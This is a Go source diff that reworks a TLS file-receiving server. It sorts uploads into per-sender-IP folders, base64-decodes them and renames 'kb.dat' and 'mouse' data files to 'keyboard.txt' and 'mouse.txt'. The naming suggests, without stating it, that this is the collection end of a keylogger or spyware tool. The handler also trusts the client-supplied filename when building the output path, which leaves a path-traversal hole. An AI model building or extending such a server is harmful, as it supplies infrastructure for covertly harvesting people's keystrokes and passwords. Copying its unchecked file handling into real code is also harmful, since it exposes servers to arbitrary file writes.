@@ -10,9 +10,9 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/base64"
 	"encoding/pem"
 	"fmt"
-	"io"
 	"math/big"
 	"net"
 	"os"
@@ -21,7 +21,7 @@ import (
 )
 
 func main() {
-	folder := "received"
+	folder := "data"
 	if _, err := os.Stat(folder); os.IsNotExist(err) {
 		err := os.Mkdir(folder, 0755)
 		if err != nil {
@@ -75,23 +75,75 @@ func main() {
 
 func handleIncoming(conn net.Conn) {
 	defer conn.Close()
+
+	remoteAddr := conn.RemoteAddr().String()
+	senderIP, _, err := net.SplitHostPort(remoteAddr)
+	if err != nil {
+		fmt.Println("Error parsing remote address:", err)
+		senderIP = remoteAddr
+	}
+
+	// Sanitize IP address for folder name (replace : with _)
+	senderFolder := strings.ReplaceAll(senderIP, ":", "_")
+	if _, err := os.Stat(senderFolder); os.IsNotExist(err) {
+		err := os.Mkdir(senderFolder, 0755)
+		if err != nil {
+			fmt.Println("Error creating sender folder:", err)
+			return
+		}
+		fmt.Println("Created folder for sender:", senderFolder)
+	}
+
 	reader := bufio.NewReader(conn)
 	fileName, _ := reader.ReadString('\n')
 	fileName = strings.TrimSpace(fileName)
 
-	file, err := os.Create(fileName)
+	// Map incoming filenames to readable names
+	var outputFileName string
+	switch fileName {
+	case "kb.dat":
+		outputFileName = "keyboard.txt"
+	case "ms.dat":
+		outputFileName = "mouse.txt"
+	default:
+		outputFileName = fileName
+	}
+
+	// Read the entire Base64 encoded content
+	var encodedData strings.Builder
+	scanner := bufio.NewScanner(reader)
+	for scanner.Scan() {
+		encodedData.WriteString(scanner.Text())
+		encodedData.WriteString("\n")
+	}
+
+	// Decode Base64 content
+	lines := strings.Split(encodedData.String(), "\n")
+	filePath := senderFolder + string(os.PathSeparator) + outputFileName
+	file, err := os.Create(filePath)
 	if err != nil {
 		fmt.Println("Error creating file:", err)
 		return
 	}
 	defer file.Close()
 
-	_, err = io.Copy(file, reader)
-	if err != nil {
-		fmt.Println("Error receiving file:", err)
-	} else {
-		fmt.Println("Received file:", fileName)
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+
+		decodedBytes, err := base64.StdEncoding.DecodeString(line)
+		if err != nil {
+			// If decoding fails, write as-is
+			file.WriteString(line + "\n")
+			continue
+		}
+
+		file.Write(decodedBytes)
 	}
+
+	fmt.Println("Received and decoded file from", senderIP+":", outputFileName)
 }
 
 func generateCert() (tls.Certificate, error) {
